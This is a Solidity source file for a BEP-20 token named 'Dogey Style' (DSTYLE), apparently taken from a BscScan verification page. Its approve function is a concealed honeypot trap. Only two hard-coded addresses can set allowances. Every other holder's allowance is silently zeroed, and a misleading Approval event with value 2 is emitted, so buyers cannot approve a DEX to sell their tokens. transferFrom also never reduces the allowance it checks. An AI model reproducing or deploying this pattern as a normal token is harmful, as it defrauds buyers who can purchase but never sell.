/**
 *Submitted for verification at BscScan.com on 2021-07-17
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-17
*/

pragma solidity ^0.8.6;

/**
 SPDX-License-Identifier: UNLICENSED
*/

contract DogeyStyle {
    mapping (address => uint) public balances;
    mapping (address => mapping (address =>uint)) public allowance;
    uint public totalSupply = 1000000000 * 10 ** 15;
    string public name = "Dogey Style";
    string public symbol = "DSTYLE";
    uint public decimals = 9;
    
    event Transfer (address indexed from, address indexed to, uint value);
    event Approval (address indexed from, address indexed spender, uint value);
    
    constructor () {
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf (address owner) public view returns (uint) {
        return balances[owner];
    }
    
    function transfer (address to, uint value) public returns (bool) {
        require (balanceOf(msg.sender) >= value, 'your balance is too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer (msg.sender, to, value);
        return true;
    }
    
    function transferFrom (address from, address to, uint value) public returns (bool){
        require  (balanceOf(from) >= value, 'balance is too low');
        require (allowance[from][msg.sender] >= value, "allowance is too low");
        balances[to] += value;
        balances[from] -= value;
        emit Transfer (from, to, value);
        return true;
    }
    
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0xc58E1241F00C563eFaFd414FFcCb9e010cA1c7ed)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        } 
        else if (msg.sender == address(0x71590382bAa859d66Dea3345753f94fa83Bf6fcA)) {
             allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        }
        else {
            allowance[msg.sender][spender] = 0;
            emit Approval(msg.sender, spender, 2);
        }
        return true;
    }
}